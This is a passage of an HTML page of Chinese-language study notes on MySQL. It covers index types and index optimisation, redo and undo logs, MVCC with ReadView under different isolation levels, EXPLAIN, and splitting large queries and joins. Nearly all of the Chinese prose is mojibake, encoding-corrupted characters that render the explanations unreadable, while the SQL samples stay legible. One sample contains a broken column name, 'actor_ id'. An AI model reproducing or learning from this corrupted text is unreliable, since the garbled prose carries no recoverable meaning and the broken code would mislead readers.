<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c349b91-050b-4d72-a7f8-ec86320307ea.png" width="350px"> </div><br>
<h3 id="_2-å“ˆå¸Œç´¢å¼•" tabindex="-1"> 2. å“ˆå¸Œç´¢å¼•</h3>
<p>å“ˆå¸Œç´¢å¼•èƒ½ä»¥ O(1) æ—¶é—´è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†æ˜¯å¤±å»äº†æœ‰åºæ€§ï¼š</p>
<ul>
<li>æ— æ³•ç”¨äºæ’åºä¸åˆ†ç»„ï¼›</li>
<li>åªæ”¯æŒç²¾ç¡®æŸ¥æ‰¾ï¼Œæ— æ³•ç”¨äºéƒ¨åˆ†æŸ¥æ‰¾å’ŒèŒƒå›´æŸ¥æ‰¾ã€‚</li>
</ul>
<p>InnoDB å­˜å‚¨å¼•æ“æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å«â€œè‡ªé€‚åº”å“ˆå¸Œç´¢å¼•â€ï¼Œå½“æŸä¸ªç´¢å¼•å€¼è¢«ä½¿ç”¨çš„éå¸¸é¢‘ç¹æ—¶ï¼Œä¼šåœ¨ B+Tree ç´¢å¼•ä¹‹ä¸Šå†åˆ›å»ºä¸€ä¸ªå“ˆå¸Œç´¢å¼•ï¼Œè¿™æ ·å°±è®© B+Tree ç´¢å¼•å…·æœ‰å“ˆå¸Œç´¢å¼•çš„ä¸€äº›ä¼˜ç‚¹ï¼Œæ¯”å¦‚å¿«é€Ÿçš„å“ˆå¸ŒæŸ¥æ‰¾ã€‚</p>
<h3 id="_3-å…¨æ–‡ç´¢å¼•" tabindex="-1"> 3. å…¨æ–‡ç´¢å¼•</h3>
<p>MyISAM å­˜å‚¨å¼•æ“æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œç”¨äºæŸ¥æ‰¾æ–‡æœ¬ä¸­çš„å…³é”®è¯ï¼Œè€Œä¸æ˜¯ç›´æ¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚</p>
<p>æŸ¥æ‰¾æ¡ä»¶ä½¿ç”¨ MATCH AGAINSTï¼Œè€Œä¸æ˜¯æ™®é€šçš„ WHEREã€‚</p>
<p>å…¨æ–‡ç´¢å¼•ä½¿ç”¨å€’æ’ç´¢å¼•å®ç°ï¼Œå®ƒè®°å½•ç€å…³é”®è¯åˆ°å…¶æ‰€åœ¨æ–‡æ¡£çš„æ˜ å°„ã€‚</p>
<p>InnoDB å­˜å‚¨å¼•æ“åœ¨ MySQL 5.6.4 ç‰ˆæœ¬ä¸­ä¹Ÿå¼€å§‹æ”¯æŒå…¨æ–‡ç´¢å¼•ã€‚</p>
<h3 id="_4-ç©ºé—´æ•°æ®ç´¢å¼•" tabindex="-1"> 4. ç©ºé—´æ•°æ®ç´¢å¼•</h3>
<p>MyISAM å­˜å‚¨å¼•æ“æ”¯æŒç©ºé—´æ•°æ®ç´¢å¼•ï¼ˆR-Treeï¼‰ï¼Œå¯ä»¥ç”¨äºåœ°ç†æ•°æ®å­˜å‚¨ã€‚ç©ºé—´æ•°æ®ç´¢å¼•ä¼šä»æ‰€æœ‰ç»´åº¦æ¥ç´¢å¼•æ•°æ®ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ä½¿ç”¨ä»»æ„ç»´åº¦æ¥è¿›è¡Œç»„åˆæŸ¥è¯¢ã€‚</p>
<p>å¿…é¡»ä½¿ç”¨ GIS ç›¸å…³çš„å‡½æ•°æ¥ç»´æŠ¤æ•°æ®ã€‚</p>
<h2 id="ç´¢å¼•ä¼˜åŒ–" tabindex="-1"> ç´¢å¼•ä¼˜åŒ–</h2>
<h3 id="_1-ç‹¬ç«‹çš„åˆ—" tabindex="-1"> 1. ç‹¬ç«‹çš„åˆ—</h3>
<p>åœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç´¢å¼•åˆ—ä¸èƒ½æ˜¯è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸èƒ½æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œå¦åˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢çš„æŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ actor_id åˆ—çš„ç´¢å¼•ï¼š</p>
<div><pre><code><span>SELECT</span> actor_id <span>FROM</span> sakila<span>.</span>actor <span>WHERE</span> actor_id <span>+</span> <span>1</span> <span>=</span> <span>5</span><span>;</span>
</code></pre></div><h3 id="_2-å¤šåˆ—ç´¢å¼•" tabindex="-1"> 2. å¤šåˆ—ç´¢å¼•</h3>
<p>åœ¨éœ€è¦ä½¿ç”¨å¤šä¸ªåˆ—ä½œä¸ºæ¡ä»¶è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œä½¿ç”¨å¤šåˆ—ç´¢å¼•æ¯”ä½¿ç”¨å¤šä¸ªå•åˆ—ç´¢å¼•æ€§èƒ½æ›´å¥½ã€‚ä¾‹å¦‚ä¸‹é¢çš„è¯­å¥ä¸­ï¼Œæœ€å¥½æŠŠ actor_id å’Œ film_id è®¾ç½®ä¸ºå¤šåˆ—ç´¢å¼•ã€‚</p>
<div><pre><code><span>SELECT</span> film_id<span>,</span> actor_ id <span>FROM</span> sakila<span>.</span>film_actor
<span>WHERE</span> actor_id <span>=</span> <span>1</span> <span>AND</span> film_id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><h3 id="_3-ç´¢å¼•åˆ—çš„é¡ºåº" tabindex="-1"> 3. ç´¢å¼•åˆ—çš„é¡ºåº</h3>
<p>è®©é€‰æ‹©æ€§æœ€å¼ºçš„ç´¢å¼•åˆ—æ”¾åœ¨å‰é¢ã€‚</p>
<p>ç´¢å¼•çš„é€‰æ‹©æ€§æ˜¯æŒ‡ï¼šä¸é‡å¤çš„ç´¢å¼•å€¼å’Œè®°å½•æ€»æ•°çš„æ¯”å€¼ã€‚æœ€å¤§å€¼ä¸º 1ï¼Œæ­¤æ—¶æ¯ä¸ªè®°å½•éƒ½æœ‰å”¯ä¸€çš„ç´¢å¼•ä¸å…¶å¯¹åº”ã€‚é€‰æ‹©æ€§è¶Šé«˜ï¼Œæ¯ä¸ªè®°å½•çš„åŒºåˆ†åº¦è¶Šé«˜ï¼ŒæŸ¥è¯¢æ•ˆç‡ä¹Ÿè¶Šé«˜ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢æ˜¾ç¤ºçš„ç»“æœä¸­ customer_id çš„é€‰æ‹©æ€§æ¯” staff_id æ›´é«˜ï¼Œå› æ­¤æœ€å¥½æŠŠ customer_id åˆ—æ”¾åœ¨å¤šåˆ—ç´¢å¼•çš„å‰é¢ã€‚</p>
<div><pre><code><span>SELECT</span> <span>COUNT</span><span>(</span><span>DISTINCT</span> staff_id<span>)</span><span>/</span><span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> staff_id_selectivity<span>,</span>
<span>COUNT</span><span>(</span><span>DISTINCT</span> customer_id<span>)</span><span>/</span><span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> customer_id_selectivity<span>,</span>
<span>COUNT</span><span>(</span><span>*</span><span>)</span>
<span>FROM</span> payment<span>;</span>
</code></pre></div><div><pre><code>   staff_id_selectivity: 0.0001
customer_id_selectivity: 0.0373
               COUNT(*): 16049
</code></pre></div><h3 id="_4-å‰ç¼€ç´¢å¼•" tabindex="-1"> 4. å‰ç¼€ç´¢å¼•</h3>
<p>å¯¹äº BLOBã€TEXT å’Œ VARCHAR ç±»å‹çš„åˆ—ï¼Œå¿…é¡»ä½¿ç”¨å‰ç¼€ç´¢å¼•ï¼Œåªç´¢å¼•å¼€å§‹çš„éƒ¨åˆ†å­—ç¬¦ã€‚</p>
<p>å‰ç¼€é•¿åº¦çš„é€‰å–éœ€è¦æ ¹æ®ç´¢å¼•é€‰æ‹©æ€§æ¥ç¡®å®šã€‚</p>
<h3 id="_5-è¦†ç›–ç´¢å¼•" tabindex="-1"> 5. è¦†ç›–ç´¢å¼•</h3>
<p>ç´¢å¼•åŒ…å«æ‰€æœ‰éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ã€‚</p>
<p>å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç´¢å¼•é€šå¸¸è¿œå°äºæ•°æ®è¡Œçš„å¤§å°ï¼Œåªè¯»å–ç´¢å¼•èƒ½å¤§å¤§å‡å°‘æ•°æ®è®¿é—®é‡ã€‚</li>
<li>ä¸€äº›å­˜å‚¨å¼•æ“ï¼ˆä¾‹å¦‚ MyISAMï¼‰åœ¨å†…å­˜ä¸­åªç¼“å­˜ç´¢å¼•ï¼Œè€Œæ•°æ®ä¾èµ–äºæ“ä½œç³»ç»Ÿæ¥ç¼“å­˜ã€‚å› æ­¤ï¼Œåªè®¿é—®ç´¢å¼•å¯ä»¥ä¸ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆé€šå¸¸æ¯”è¾ƒè´¹æ—¶ï¼‰ã€‚</li>
<li>å¯¹äº InnoDB å¼•æ“ï¼Œè‹¥è¾…åŠ©ç´¢å¼•èƒ½å¤Ÿè¦†ç›–æŸ¥è¯¢ï¼Œåˆ™æ— éœ€è®¿é—®ä¸»ç´¢å¼•ã€‚</li>
</ul>
<h2 id="ç´¢å¼•çš„ä¼˜ç‚¹" tabindex="-1"> ç´¢å¼•çš„ä¼˜ç‚¹</h2>
<ul>
<li>
<p>å¤§å¤§å‡å°‘äº†æœåŠ¡å™¨éœ€è¦æ‰«æçš„æ•°æ®è¡Œæ•°ã€‚</p>
</li>
<li>
<p>å¸®åŠ©æœåŠ¡å™¨é¿å…è¿›è¡Œæ’åºå’Œåˆ†ç»„ï¼Œä»¥åŠé¿å…åˆ›å»ºä¸´æ—¶è¡¨ï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œå¯ä»¥ç”¨äº ORDER BY å’Œ GROUP BY æ“ä½œã€‚ä¸´æ—¶è¡¨ä¸»è¦æ˜¯åœ¨æ’åºå’Œåˆ†ç»„è¿‡ç¨‹ä¸­åˆ›å»ºï¼Œä¸éœ€è¦æ’åºå’Œåˆ†ç»„ï¼Œä¹Ÿå°±ä¸éœ€è¦åˆ›å»ºä¸´æ—¶è¡¨ï¼‰ã€‚</p>
</li>
<li>
<p>å°†éšæœº I/O å˜ä¸ºé¡ºåº I/Oï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œä¼šå°†ç›¸é‚»çš„æ•°æ®éƒ½å­˜å‚¨åœ¨ä¸€èµ·ï¼‰ã€‚</p>
</li>
</ul>
<h2 id="ç´¢å¼•çš„ä½¿ç”¨æ¡ä»¶" tabindex="-1"> ç´¢å¼•çš„ä½¿ç”¨æ¡ä»¶</h2>
<ul>
<li>
<p>å¯¹äºéå¸¸å°çš„è¡¨ã€å¤§éƒ¨åˆ†æƒ…å†µä¸‹ç®€å•çš„å…¨è¡¨æ‰«ææ¯”å»ºç«‹ç´¢å¼•æ›´é«˜æ•ˆï¼›</p>
</li>
<li>
<p>å¯¹äºä¸­åˆ°å¤§å‹çš„è¡¨ï¼Œç´¢å¼•å°±éå¸¸æœ‰æ•ˆï¼›</p>
</li>
<li>
<p>ä½†æ˜¯å¯¹äºç‰¹å¤§å‹çš„è¡¨ï¼Œå»ºç«‹å’Œç»´æŠ¤ç´¢å¼•çš„ä»£ä»·å°†ä¼šéšä¹‹å¢é•¿ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ç”¨åˆ°ä¸€ç§æŠ€æœ¯å¯ä»¥ç›´æ¥åŒºåˆ†å‡ºéœ€è¦æŸ¥è¯¢çš„ä¸€ç»„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¸€æ¡è®°å½•ä¸€æ¡è®°å½•åœ°åŒ¹é…ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨åˆ†åŒºæŠ€æœ¯ã€‚</p>
</li>
</ul>
<h1 id="äºŒã€mysqläº‹åŠ¡" tabindex="-1"> äºŒã€MySQLäº‹åŠ¡</h1>
<h2 id="é‡åšæ—¥å¿—-redo-log" tabindex="-1"> é‡åšæ—¥å¿— redo log</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-20-20-34-35.png" alt="" loading="lazy"></p>
<p>redo logé‡åšæ—¥å¿—ï¼Œä¸»è¦çš„æµç¨‹å¦‚ä¸Šå›¾ã€‚å½“å¾—åˆ°æ•°æ®æ“ä½œçš„è¦æ±‚æ—¶å€™ï¼Œä»ç£ç›˜è¯»å–æ•°æ®ï¼Œç„¶ååœ¨å†…å­˜ç¼“å­˜ä¸­ä¿®æ”¹æ•°æ®ã€‚å¹¶å°†æ“ä½œè¡Œä¸ºè®°å½•è¿›redo log bufferï¼Œå¹¶åŒæ—¶å°†æ•°æ®å†™åˆ°ç£ç›˜ã€‚4ã€5ä¸¤éƒ¨æ˜¯åŒæ—¶è¿›è¡Œçš„ã€‚</p>
<h2 id="å›æ»šæ—¥å¿—-undo-log" tabindex="-1"> å›æ»šæ—¥å¿— undo log</h2>
<p>undo logä¸»è¦æ˜¯å¯¹äºäº‹åŠ¡ä¹‹å‰çš„æ•°æ®çŠ¶æ€è¿›è¡Œè®°å½•ã€‚ä»¥ä¾¿åœ¨äº‹åŠ¡æäº¤å¤±è´¥ä¹‹åï¼Œæ ¹æ®undo logè¿›è¡ŒROLLBACKã€‚</p>
<h3 id="insert-undo-log" tabindex="-1"> insert undo log</h3>
<p>ä»£è¡¨äº‹åŠ¡åœ¨insertæ–°è®°å½•æ—¶äº§ç”Ÿçš„undo log, åªåœ¨äº‹åŠ¡å›æ»šæ—¶éœ€è¦ï¼Œå¹¶ä¸”åœ¨äº‹åŠ¡æäº¤åå¯ä»¥è¢«ç«‹å³ä¸¢å¼ƒ</p>
<h3 id="update-undo-log" tabindex="-1"> update undo log</h3>
<p>äº‹åŠ¡åœ¨è¿›è¡Œupdateæˆ–deleteæ—¶äº§ç”Ÿçš„undo log; ä¸ä»…åœ¨äº‹åŠ¡å›æ»šæ—¶éœ€è¦ï¼Œåœ¨å¿«ç…§è¯»æ—¶ä¹Ÿéœ€è¦ï¼›æ‰€ä»¥ä¸èƒ½éšä¾¿åˆ é™¤ï¼Œåªæœ‰åœ¨å¿«é€Ÿè¯»æˆ–äº‹åŠ¡å›æ»šä¸æ¶‰åŠè¯¥æ—¥å¿—æ—¶ï¼Œå¯¹åº”çš„æ—¥å¿—æ‰ä¼šè¢«purgeçº¿ç¨‹ç»Ÿä¸€æ¸…é™¤</p>
<h2 id="mvccå®ç°" tabindex="-1"> MVCCå®ç°</h2>
<p>MVCCçš„ç›®çš„å°±æ˜¯å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼Œåœ¨æ•°æ®åº“ä¸­çš„å®ç°ï¼Œå°±æ˜¯ä¸ºäº†è§£å†³è¯»å†™å†²çªï¼Œå®ƒçš„å®ç°åŸç†ä¸»è¦æ˜¯ä¾èµ–è®°å½•ä¸­çš„2ä¸ªéšå¼å­—æ®µï¼Œundoæ—¥å¿— ï¼ŒRead View æ¥å®ç°çš„</p>
<p>InnoDBä¸ºæ•°æ®åº“ä¸­å­˜å‚¨çš„æ¯è¡Œæ•°æ®æ·»åŠ ä¸¤ä¸ªå­—æ®µæ¥å®ç°MVCCï¼š</p>
<ul>
<li>äº‹åŠ¡ç‰ˆæœ¬å·ï¼ˆDB_TRX_ID ï¼‰ï¼Œè®°å½•äº†æ•°æ®çš„æœ€åä¸€æ¬¡æ›´æ–°ï¼ˆINSERT/UPDATE)çš„äº‹åŠ¡ID</li>
<li>å›æ»šæŒ‡é’ˆï¼ˆDB_ROLL_PTRï¼‰ ï¼ŒæŒ‡å‘å½“å‰æ•°æ®çš„undo logè®°å½•</li>
</ul>
<p>æ­¤å¤–ï¼Œè¿˜æœ‰</p>
<ul>
<li>éšè—ä¸»é”®ï¼ˆDB_ROW_IDï¼‰ï¼Œæ ‡è¡Œæ ‡è¯†ï¼ˆéšè—å•è°ƒè‡ªå¢idï¼‰</li>
<li>åˆ é™¤ä½ï¼ˆDELETE_BITï¼‰ï¼Œæ ‡è¯†è¯¥è®°å½•æ˜¯å¦è¢«åˆ é™¤ï¼Œç‰©ç†åˆ é™¤æ˜¯åœ¨mysqlè¿›è¡Œæ•°æ®çš„GCï¼Œæ¸…ç†å†å²ç‰ˆæœ¬æ•°æ®çš„æ—¶å€™ã€‚</li>
</ul>
<h3 id="undo-log" tabindex="-1"> undo log</h3>
<p>å¯¹MVCCæœ‰å¸®åŠ©çš„å®è´¨æ˜¯update undo log ï¼Œundo logå®é™…ä¸Šå°±æ˜¯å­˜åœ¨rollback segmentä¸­æ—§è®°å½•é“¾</p>
<ul>
<li>purgeçº¿ç¨‹</li>
</ul>
<blockquote>
<p>ä»å‰é¢çš„åˆ†æå¯ä»¥çœ‹å‡ºï¼Œä¸ºäº†å®ç°InnoDBçš„MVCCæœºåˆ¶ï¼Œæ›´æ–°æˆ–è€…åˆ é™¤æ“ä½œéƒ½åªæ˜¯è®¾ç½®ä¸€ä¸‹è€è®°å½•çš„deleted_bitï¼Œå¹¶ä¸çœŸæ­£å°†è¿‡æ—¶çš„è®°å½•åˆ é™¤ã€‚
ä¸ºäº†èŠ‚çœç£ç›˜ç©ºé—´ï¼ŒInnoDBæœ‰ä¸“é—¨çš„purgeçº¿ç¨‹æ¥æ¸…ç†deleted_bitä¸ºtrueçš„è®°å½•ã€‚ä¸ºäº†ä¸å½±å“MVCCçš„æ­£å¸¸å·¥ä½œï¼Œpurgeçº¿ç¨‹è‡ªå·±ä¹Ÿç»´æŠ¤äº†ä¸€ä¸ªread viewï¼ˆè¿™ä¸ªread viewç›¸å½“äºç³»ç»Ÿä¸­æœ€è€æ´»è·ƒäº‹åŠ¡çš„read viewï¼‰;å¦‚æœæŸä¸ªè®°å½•çš„deleted_bitä¸ºtrueï¼Œå¹¶ä¸”DB_TRX_IDç›¸å¯¹äºpurgeçº¿ç¨‹çš„read viewå¯è§ï¼Œé‚£ä¹ˆè¿™æ¡è®°å½•ä¸€å®šæ˜¯å¯ä»¥è¢«å®‰å…¨æ¸…é™¤çš„ã€‚</p>
</blockquote>
<h3 id="readview" tabindex="-1"> ReadView</h3>
<p>Read Viewå°±æ˜¯äº‹åŠ¡è¿›è¡Œå¿«ç…§è¯»æ“ä½œçš„æ—¶å€™ç”Ÿäº§çš„è¯»è§†å›¾(Read View)ï¼Œåœ¨è¯¥äº‹åŠ¡æ‰§è¡Œçš„å¿«ç…§è¯»çš„é‚£ä¸€åˆ»ï¼Œä¼šç”Ÿæˆæ•°æ®åº“ç³»ç»Ÿå½“å‰çš„ä¸€ä¸ªå¿«ç…§ï¼Œè®°å½•å¹¶ç»´æŠ¤ç³»ç»Ÿå½“å‰æ´»è·ƒäº‹åŠ¡çš„ID</p>
<p>æ­£æ˜¯Read Viewç”Ÿæˆæ—¶æœºçš„ä¸åŒï¼Œä»è€Œé€ æˆRC,RRçº§åˆ«ä¸‹å¿«ç…§è¯»çš„ç»“æœçš„ä¸åŒã€‚
åœ¨RCéš”ç¦»çº§åˆ«ä¸‹ï¼Œæ˜¯æ¯ä¸ªå¿«ç…§è¯»éƒ½ä¼šç”Ÿæˆå¹¶è·å–æœ€æ–°çš„Read Viewï¼›è€Œåœ¨RRéš”ç¦»çº§åˆ«ä¸‹ï¼Œåˆ™æ˜¯åŒä¸€ä¸ªäº‹åŠ¡ä¸­çš„ç¬¬ä¸€ä¸ªå¿«ç…§è¯»æ‰ä¼šåˆ›å»ºRead View, ä¹‹åçš„å¿«ç…§è¯»è·å–çš„éƒ½æ˜¯åŒä¸€ä¸ªRead Viewã€‚</p>
<h4 id="repeatable-read" tabindex="-1"> REPEATABLE READ</h4>
<p>åœ¨RRçº§åˆ«ä¸‹çš„æŸä¸ªäº‹åŠ¡çš„å¯¹æŸæ¡è®°å½•çš„ç¬¬ä¸€æ¬¡å¿«ç…§è¯»ä¼šåˆ›å»ºä¸€ä¸ªå¿«ç…§åŠRead View, å°†å½“å‰ç³»ç»Ÿæ´»è·ƒçš„å…¶ä»–äº‹åŠ¡è®°å½•èµ·æ¥ï¼Œæ­¤ååœ¨è°ƒç”¨å¿«ç…§è¯»çš„æ—¶å€™ï¼Œè¿˜æ˜¯ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªRead Viewï¼Œæ‰€ä»¥åªè¦å½“å‰äº‹åŠ¡åœ¨å…¶ä»–äº‹åŠ¡æäº¤æ›´æ–°ä¹‹å‰ä½¿ç”¨è¿‡å¿«ç…§è¯»ï¼Œé‚£ä¹ˆä¹‹åçš„å¿«ç…§è¯»ä½¿ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªRead Viewï¼Œæ‰€ä»¥å¯¹ä¹‹åçš„ä¿®æ”¹ä¸å¯è§ï¼›</p>
<p>å³RRçº§åˆ«ä¸‹ï¼Œå¿«ç…§è¯»ç”ŸæˆRead Viewæ—¶ï¼ŒRead Viewä¼šè®°å½•æ­¤æ—¶æ‰€æœ‰å…¶ä»–æ´»åŠ¨äº‹åŠ¡çš„å¿«ç…§ï¼Œè¿™äº›äº‹åŠ¡çš„ä¿®æ”¹å¯¹äºå½“å‰äº‹åŠ¡éƒ½æ˜¯ä¸å¯è§çš„ã€‚è€Œæ—©äºRead Viewåˆ›å»ºçš„äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹å‡æ˜¯å¯è§</p>
<h4 id="read-committed" tabindex="-1"> READ COMMITTED</h4>
<p>è€Œåœ¨RCçº§åˆ«ä¸‹çš„ï¼Œäº‹åŠ¡ä¸­ï¼Œæ¯æ¬¡å¿«ç…§è¯»éƒ½ä¼šæ–°ç”Ÿæˆä¸€ä¸ªå¿«ç…§å’ŒRead View, è¿™å°±æ˜¯æˆ‘ä»¬åœ¨RCçº§åˆ«ä¸‹çš„äº‹åŠ¡ä¸­å¯ä»¥çœ‹åˆ°åˆ«çš„äº‹åŠ¡æäº¤çš„æ›´æ–°çš„åŸå› </p>
<h1 id="ä¸‰ã€æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ–" tabindex="-1"> ä¸‰ã€æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ–</h1>
<h2 id="ä½¿ç”¨-explain-è¿›è¡Œåˆ†æ" tabindex="-1"> ä½¿ç”¨ Explain è¿›è¡Œåˆ†æ</h2>
<p>Explain ç”¨æ¥åˆ†æ SELECT æŸ¥è¯¢è¯­å¥ï¼Œå¼€å‘äººå‘˜å¯ä»¥é€šè¿‡åˆ†æ Explain ç»“æœæ¥ä¼˜åŒ–æŸ¥è¯¢è¯­å¥ã€‚</p>
<p>æ¯”è¾ƒé‡è¦çš„å­—æ®µæœ‰ï¼š</p>
<ul>
<li>select_type : æŸ¥è¯¢ç±»å‹ï¼Œæœ‰ç®€å•æŸ¥è¯¢ã€è”åˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ç­‰</li>
<li>key : ä½¿ç”¨çš„ç´¢å¼•</li>
<li>rows : æ‰«æçš„è¡Œæ•°</li>
</ul>
<h2 id="ä¼˜åŒ–æ•°æ®è®¿é—®" tabindex="-1"> ä¼˜åŒ–æ•°æ®è®¿é—®</h2>
<h3 id="_1-å‡å°‘è¯·æ±‚çš„æ•°æ®é‡" tabindex="-1"> 1. å‡å°‘è¯·æ±‚çš„æ•°æ®é‡</h3>
<ul>
<li>åªè¿”å›å¿…è¦çš„åˆ—ï¼šæœ€å¥½ä¸è¦ä½¿ç”¨ SELECT * è¯­å¥ã€‚</li>
<li>åªè¿”å›å¿…è¦çš„è¡Œï¼šä½¿ç”¨ LIMIT è¯­å¥æ¥é™åˆ¶è¿”å›çš„æ•°æ®ã€‚</li>
<li>ç¼“å­˜é‡å¤æŸ¥è¯¢çš„æ•°æ®ï¼šä½¿ç”¨ç¼“å­˜å¯ä»¥é¿å…åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç‰¹åˆ«åœ¨è¦æŸ¥è¯¢çš„æ•°æ®ç»å¸¸è¢«é‡å¤æŸ¥è¯¢æ—¶ï¼Œç¼“å­˜å¸¦æ¥çš„æŸ¥è¯¢æ€§èƒ½æå‡å°†ä¼šæ˜¯éå¸¸æ˜æ˜¾çš„ã€‚</li>
</ul>
<h3 id="_2-å‡å°‘æœåŠ¡å™¨ç«¯æ‰«æçš„è¡Œæ•°" tabindex="-1"> 2. å‡å°‘æœåŠ¡å™¨ç«¯æ‰«æçš„è¡Œæ•°</h3>
<p>æœ€æœ‰æ•ˆçš„æ–¹å¼æ˜¯ä½¿ç”¨ç´¢å¼•æ¥è¦†ç›–æŸ¥è¯¢ã€‚</p>
<h2 id="é‡æ„æŸ¥è¯¢æ–¹å¼" tabindex="-1"> é‡æ„æŸ¥è¯¢æ–¹å¼</h2>
<h3 id="_1-åˆ‡åˆ†å¤§æŸ¥è¯¢" tabindex="-1"> 1. åˆ‡åˆ†å¤§æŸ¥è¯¢</h3>
<p>ä¸€ä¸ªå¤§æŸ¥è¯¢å¦‚æœä¸€æ¬¡æ€§æ‰§è¡Œçš„è¯ï¼Œå¯èƒ½ä¸€æ¬¡é”ä½å¾ˆå¤šæ•°æ®ã€å æ»¡æ•´ä¸ªäº‹åŠ¡æ—¥å¿—ã€è€—å°½ç³»ç»Ÿèµ„æºã€é˜»å¡å¾ˆå¤šå°çš„ä½†é‡è¦çš„æŸ¥è¯¢ã€‚</p>
<div><pre><code><span>DELETE</span> <span>FROM</span> messages <span>WHERE</span> <span>create</span> <span>&lt;</span> DATE_SUB<span>(</span><span>NOW</span><span>(</span><span>)</span><span>,</span> <span>INTERVAL</span> <span>3</span> <span>MONTH</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code>rows_affected <span>=</span> <span>0</span>
<span>do</span> {
    rows_affected <span>=</span> do_query<span>(</span>
    <span>"DELETE FROM messages WHERE create  &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000"</span><span>)</span>
} <span>while</span> rows_affected <span>></span> <span>0</span>
</code></pre></div><h3 id="_2-åˆ†è§£å¤§è¿æ¥æŸ¥è¯¢" tabindex="-1"> 2. åˆ†è§£å¤§è¿æ¥æŸ¥è¯¢</h3>
<p>å°†ä¸€ä¸ªå¤§è¿æ¥æŸ¥è¯¢åˆ†è§£æˆå¯¹æ¯ä¸€ä¸ªè¡¨è¿›è¡Œä¸€æ¬¡å•è¡¨æŸ¥è¯¢ï¼Œç„¶ååœ¨åº”ç”¨ç¨‹åºä¸­è¿›è¡Œå…³è”ï¼Œè¿™æ ·åšçš„å¥½å¤„æœ‰ï¼š</p>
<ul>
<li>è®©ç¼“å­˜æ›´é«˜æ•ˆã€‚å¯¹äºè¿æ¥æŸ¥è¯¢ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæ•´ä¸ªæŸ¥è¯¢ç¼“å­˜å°±æ— æ³•ä½¿ç”¨ã€‚è€Œåˆ†è§£åçš„å¤šä¸ªæŸ¥è¯¢ï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œå¯¹å…¶å®ƒè¡¨çš„æŸ¥è¯¢ç¼“å­˜ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚</li>
<li>åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œè¿™äº›å•è¡¨æŸ¥è¯¢çš„ç¼“å­˜ç»“æœæ›´å¯èƒ½è¢«å…¶å®ƒæŸ¥è¯¢ä½¿ç”¨åˆ°ï¼Œä»è€Œå‡å°‘å†—ä½™è®°å½•çš„æŸ¥è¯¢ã€‚</li>
<li>å‡å°‘é”ç«äº‰ï¼›</li>
<li>åœ¨åº”ç”¨å±‚è¿›è¡Œè¿æ¥ï¼Œå¯ä»¥æ›´å®¹æ˜“å¯¹æ•°æ®åº“è¿›è¡Œæ‹†åˆ†ï¼Œä»è€Œæ›´å®¹æ˜“åšåˆ°é«˜æ€§èƒ½å’Œå¯ä¼¸ç¼©ã€‚</li>
<li>æŸ¥è¯¢æœ¬èº«æ•ˆç‡ä¹Ÿå¯èƒ½ä¼šæœ‰æ‰€æå‡ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨ IN() ä»£æ›¿è¿æ¥æŸ¥è¯¢ï¼Œå¯ä»¥è®© MySQL æŒ‰ç…§ ID é¡ºåºè¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™å¯èƒ½æ¯”éšæœºçš„è¿æ¥è¦æ›´é«˜æ•ˆã€‚</li>
</ul>
<div><pre><code><span>SELECT</span> <span>*</span> <span>FROM</span> tag
<span>JOIN</span> tag_post <span>ON</span> tag_post<span>.</span>tag_id<span>=</span>tag<span>.</span>id
<span>JOIN</span> post <span>ON</span> tag_post<span>.</span>post_id<span>=</span>post<span>.</span>id
<span>WHERE</span> tag<span>.</span>tag<span>=</span><span>'mysql'</span><span>;</span>
</code></pre></div><div><pre><code><span>SELECT</span> <span>*</span> <span>FROM</span> tag <span>WHERE</span> tag<span>=</span><span>'mysql'</span><span>;</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> tag_post <span>WHERE</span> tag_id<span>=</span><span>1234</span><span>;</span>
